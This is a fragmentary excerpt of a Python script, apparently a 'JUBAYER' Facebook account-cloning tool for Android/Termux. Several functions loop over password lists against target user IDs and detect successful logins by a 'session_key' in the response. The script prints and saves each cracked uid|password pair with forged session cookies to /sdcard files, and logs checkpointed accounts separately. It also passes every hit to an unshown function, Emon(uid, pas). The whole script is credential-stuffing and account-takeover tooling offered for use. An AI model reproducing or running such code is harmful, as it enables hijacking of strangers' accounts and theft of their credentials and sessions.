...
'\033[1;34m'┛┗┛┗┛┗┛  ┗┛┗┛┻┛┛┗┗┛┗┛┛┗
 ...
 {G}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 {R}❲{G}😇{R}❳{G} 𝘿𝙀𝙑𝙀𝙇𝙊𝙋𝙀𝙍 {R}:{G} JUBAYER☬
 {R}❲{G}💚{R}❳{G} 𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆  {R}:{G} HAK JUBAYER
...
def approval():
  ...
  id = "-".join(uuid)
  try:
    httpCaht = requests.get('https://github.com/JUBAYER-420/HAK-JUBAYER.git').text
    if id in httpCaht:
      ...
      print(f'{R}❲{G}1{R}❳{G} Your Key {R}:{G} JUBAYER=['+id+']=XD')
      linex()
...
def file():
    clear();print(f"{R}❲{G}~{R}❳{G} Example {R}:{R} /{G}sdcard{R}/{G}JUBAYER.txt {R}❲{G}ETC{R}❳{G}");linex()
    ...
    print(f"{R}❲{G}~{R}❳{G} Cloning Accounts Saved in /sdcard/JUBAYER_M1_FILE_OK.txt")
    print(f'\r{R}--------------------------------------------------')
...
def bd():
                ...
                print(f'\r{R}--------------------------------------------------')
                input(f"{R}❲{G}~{R}❳{G} Press Enter To Go Back ")
                os.system('python Main_JUBAYER.py')
...
def gmail():
                ...
                clear()
                print(f'{R}❲{G}~{R}❳{G} Example {R}:{G} Chadni {R}|{G} Nurnobi {R}|{G} Sompa {R}|{G} JUBAYER');linex()
...
def rd1(ids,passlist):
    try:
        ...
        sys.stdout.write(f'\r{R}❲{G}JUBAYER🥰-𝐗𝐃{R}❳{A}-{R}❲{G}%s{R}❳{A}-{R}❲{G}OK{R}❳{A}-{R}❲{G}%s{R}❳ \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        for pas in passlist:
                ...
                if 'session_key' in po:
                        ...
                        status= lock(uid)
                        if "Active" in status:
                        	print(f'\r{R}❲{G}JUBAYER🥰-𝐗𝐃_OK{R}❳{G} '+uid+f' {R}|{G} '+pas)
                        	Emon(uid,pas)
                        print(f"\r{R}❲{G}COOKIE{R}❳{A}->{G} {cookie}")
                        file_path_ok = os.path.join(folder_path, 'JUBAYER-RANDOM-OK.txt')
                        file_path_cookies = os.path.join(folder_path, 'JUBAYER-RANDOM-COOKIE.txt')
                        ...
                        print(f'\r{R}❲{Y}JUBAYER🥰-CP{R}❳{Y} '+uid+f' {R}|{Y} '+pas+'\033[1;97m')
                        file_path = os.path.join(folder_path, 'JUBAYER-RANDOM-CP.txt')
...
def api1(ids,names,passlist):
    try:
        global ok,loop,sim_id
        sys.stdout.write(f'\r{R}❲{G}JUBAYER-T1{R}❳{A}-{R}❲{G}%s{R}❳{A}-{R}❲{G}OK{R}❳{A}-{R}❲{G}%s{R}❳ \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
        ...
        for pw in passlist:
            ...
            if 'session_key' in po:
                    ...
                    ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                    cookie = f"sb={ssbb};{ckkk}"
                    print(f'\r{R}❲{G} IJUBAYER🥰-OK{R}❳{G} '+uid+f' {R}|{G} '+pas)
                    Emon(uid,pas)
                    print(f"\r{R}❲{G}COOKIE{R}❳{A}->{G} {cookie}")
                    file_path = os.path.join(folder_path, 'JUBAYER-FILE-M1-OK.txt')
                    open('/sdcard/XD/JUBAYER-FILE-M1-OK-COOKIE.txt','a').write(uid+' | '+pas+' |------> '+cookie+'\n')
                    with open(file_path, 'a') as file:
                        file.write(uid+' | '+pas+'\n')
                    oks.append(uid)
                    break
                    ...
                    uid = str(po['error']['error_data']['uid'])
                    print(f'\r{R}❲{Y}JUBAYER🥰-CP{R}❳{Y} '+uid+f' {R}|{Y} '+pas+'\033[1;97m')
                    file_path = os.path.join(folder_path, 'JUBAYER-FILE-M1-CP.txt')
                    with open(file_path, 'a') as file:
                        file.write(uid+' | '+pas+'\n')
                    cps.append(uid)
                    break
...
def api2(ids,names,passlist):
    try:
        global ok,loop,sim_id
        sys.stdout.write(f'\r{R}❲{G}JUBAYER-T2{R}❳{A}-{R}❲{G}%s{R}❳{A}-{R}❲{G}OK{R}❳{A}-{R}❲{G}%s{R}❳ \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
        ...
        for pw in passlist:
            ...
            if 'session_key' in po:
                    ...
                    ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                    cookie = f"sb={ssbb};{ckkk}"
                    print(f'\r{R}❲{G}JUBAYER🥰-OK{R}❳ '+uid+f' {R}|{G} '+pas)
                    Emon(uid,pas)
                    print(f"\r{R}❲{G}COOKIE{R}❳{A}->{G} {cookie}")
                    file_path = os.path.join(folder_path, 'JUBAYER-FILE-M2-OK.txt')
                    open('/sdcard/XD/JUBAYER-FILE-M2-OK-COOKIE.txt','a').write(uid+' | '+pas+' |----> '+cookie+'\n')
                    with open(file_path, 'a') as file:
                        file.write(uid+' | '+pas+'\n')
                    oks.append(uid)
                    break
                    ...
                    uid = str(po['error']['error_data']['uid'])
                    print(f'\r{R}❲{Y}JUBAYER🥰-CP{R}❳{Y} '+uid+f' {R}|{Y} '+pas+'\033[1;97m')
                    file_path = os.path.join(folder_path, 'JUBAYER-FILE-M2-CP.txt')
                    with open(file_path, 'a') as file:
                        file.write(uid+' | '+pas+'\n')
                    cps.append(uid)
                    break
